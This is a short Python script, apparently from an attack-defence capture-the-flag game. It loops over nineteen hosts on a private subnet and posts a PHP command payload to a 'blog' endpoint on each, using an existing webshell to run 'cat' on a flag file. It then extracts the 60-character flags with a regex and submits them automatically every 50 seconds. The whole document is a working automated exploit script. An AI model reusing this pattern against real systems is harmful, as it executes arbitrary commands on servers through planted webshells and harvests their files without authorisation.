import requests
import submit
import re
from time import sleep
exploit_list = [
]

for i in range(1, 20):
    exploit_list.append("http://172.16.1.%s:20003/blog/an-artical" % (i))


mat = re.compile(".*([0-9a-zA-Z]{60}).*")

def crack_oneword():
    for i in exploit_list:
        r = requests.post(i, data={"test": 'system("cat /home/njweb/flag/flag");'})
        a = mat.findall(r.content)
        if len(a) > 0:
           submit.submit(a[0])
        else:
            print i


while True:
    crack_oneword()
    sleep(50)